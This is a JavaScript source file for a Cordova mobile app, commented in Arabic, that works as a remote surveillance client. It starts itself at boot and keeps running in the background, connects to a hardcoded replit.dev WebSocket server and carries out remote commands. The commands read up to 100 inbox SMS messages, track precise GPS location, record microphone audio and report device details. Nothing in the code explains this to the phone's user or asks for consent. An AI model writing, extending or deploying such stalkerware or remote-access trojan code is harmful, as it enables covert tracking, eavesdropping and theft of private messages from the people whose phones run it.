document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

let deviceInfo = null;
let wsConnection = null;
let reconnectTimeout = null;
let heartbeatInterval = null;

function onDeviceReady() {
  console.log('Device is ready');

  // توليد معلومات الجهاز
  deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };

  // تمكين الخدمة الأمامية (Foreground Service)
  if (cordova.plugins.foregroundService) {
    cordova.plugins.foregroundService.start(
      'التطبيق يعمل',
      'جارٍ مراقبة الأوامر في الخلفية',
      'ic_stat_icon'
    );
  }

  // تمكين التشغيل التلقائي عند التشغيل
  if (cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable();
    cordova.plugins.autoStart.enableBootStart();
  }

  // منع إيقاف الخدمة بسبب تحسين البطارية (يطلب من المستخدم السماح)
  try {
    cordova.plugins.BatteryStatus.isIgnoringBatteryOptimizations((isIgnored) => {
      if (!isIgnored) {
        cordova.plugins.BatteryStatus.requestIgnoreBatteryOptimizations(() => {
          console.log('تم طلب إذن تجاهل تحسين البطارية');
        }, (err) => {
          console.warn('فشل في طلب إذن تجاهل تحسين البطارية:', err);
        });
      }
    });
  } catch (e) {
    console.log('Battery optimization plugin not available');
  }

  // الحصول على حالة البطارية
  updateBatteryInfo();

  // بدء الاتصال بالخادم
  startWebSocketConnection();

  // مراقبة تغير البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(e => console.error('Battery API error:', e));
  }

  // منع إغلاق التطبيق في الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'اتصال نشط مع الخادم'
    });
    cordova.plugins.backgroundMode.enable();
  }
}

// دالة لتحديث معلومات البطارية
function updateBatteryInfo() {
  if (!deviceInfo) return;

  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };

      // إرسال تحديث البطارية للخادم إذا كان الاتصال مفتوحًا
      if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
        wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    }).catch(e => console.error('Battery error:', e));
  }
}

// دالة لبدء الاتصال بالـ WebSocket
function startWebSocketConnection() {
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';

  if (wsConnection) {
    wsConnection.onopen = null;
    wsConnection.onmessage = null;
    wsConnection.onclose = null;
    wsConnection.onerror = null;
  }

  wsConnection = new WebSocket(wsUrl);

  wsConnection.onopen = () => {
    console.log('✅ اتصال WebSocket مفتوح');
    clearInterval(reconnectTimeout);
    reconnectTimeout = null;

    // تسجيل الجهاز
    if (deviceInfo) {
      wsConnection.send(JSON.stringify({
        type: 'register',
        deviceId: deviceInfo.uuid,
        deviceInfo
      }));
    }

    // إرسال نبضات قلبية
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    heartbeatInterval = setInterval(() => {
      if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
        wsConnection.send(JSON.stringify({
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          battery: deviceInfo.battery,
          requestsCount: receivedRequests.length
        }));
      }
    }, 30000);
  };

  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });
        executeCommand(data.command, (response) => {
          if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: { ...response, requestData: data.command }
            }));
          }
        });
      }
    } catch (e) {
      console.error('خطأ في معالجة الرسالة:', e);
    }
  };

  wsConnection.onerror = (error) => {
    console.error('❌ خطأ في WebSocket:', error);
  };

  wsConnection.onclose = () => {
    console.log('⚠️ اتصال WebSocket مغلق، إعادة المحاولة بعد 10 ثواني...');
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    if (!reconnectTimeout) {
      reconnectTimeout = setTimeout(() => {
        startWebSocketConnection();
      }, 10000);
    }
  };
}

// تنفيذ الأوامر
function executeCommand(command, callback) {
  const commandId = Date.now();
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration || 10, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({ commandId, status: 'error', error: 'أمر غير معروف' });
  }
}

// دالة توليد UUID إذا لم يكن متوفرًا
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// --- دالات تنفيذ الأوامر ---
function getLocation(commandId, callback) {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const loc = pos.coords;
      callback({
        commandId,
        status: 'success',
        location: {
          lat: loc.latitude,
          lng: loc.longitude,
          acc: loc.accuracy,
          alt: loc.altitude,
          speed: loc.speed,
          time: pos.timestamp
        },
        map: `https://maps.google.com/?q=${loc.latitude},${loc.longitude}`
      });
    },
    (err) => callback({ commandId, status: 'error', error: 'Location failed', details: err.message }),
    { timeout: 15000, enableHighAccuracy: true }
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') return callback({ commandId, status: 'error', error: 'SMS plugin not installed' });

  SMS.listSMS({ box: 'inbox', maxCount: 100 }, (msgs) => {
    callback({
      commandId,
      status: 'success',
      count: msgs.length,
      messages: msgs.map(m => ({ from: m.address, body: m.body, date: m.date }))
    });
  }, (err) => callback({ commandId, status: 'error', error: 'SMS read error', details: err }));
}

function recordAudio(commandId, duration, callback) {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const media = new MediaRecorder(stream);
      const chunks = [];
      media.ondataavailable = e => chunks.push(e.data);
      media.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/mp3' });
        const url = URL.createObjectURL(blob);
        saveAudio(commandId, blob);
        callback({ commandId, status: 'success', audioUrl: url, duration });
      };
      media.start();
      setTimeout(() => {
        media.stop();
        stream.getTracks().forEach(t => t.stop());
      }, duration * 1000);
    })
    .catch(err => callback({ commandId, status: 'error', error: 'Audio error', details: err.message }));
}

function saveAudio(id, blob) {
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(`rec_${id}.mp3`, { create: true }, file => {
      file.createWriter(w => {
        w.write(blob);
        w.onwriteend = () => console.log('تم حفظ التسجيل:', file.nativeURL);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  callback({ commandId, status: 'success', deviceInfo });
}

function getReceivedRequests(commandId, callback) {
  callback({ commandId, status: 'success', requests: receivedRequests });
}

// --- استئناف الاتصال عند العودة للتطبيق ---
document.addEventListener('resume', () => {
  if (wsConnection && wsConnection.readyState !== WebSocket.OPEN) {
    console.log('التطبيق عاد، إعادة الاتصال...');
    startWebSocketConnection();
  }
});

// --- الحفاظ على الخدمة نشطة ---
document.addEventListener('pause', () => {
  // لا توقف الخدمة
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.configure({
      disableStatusBar: false
    });
  }
});
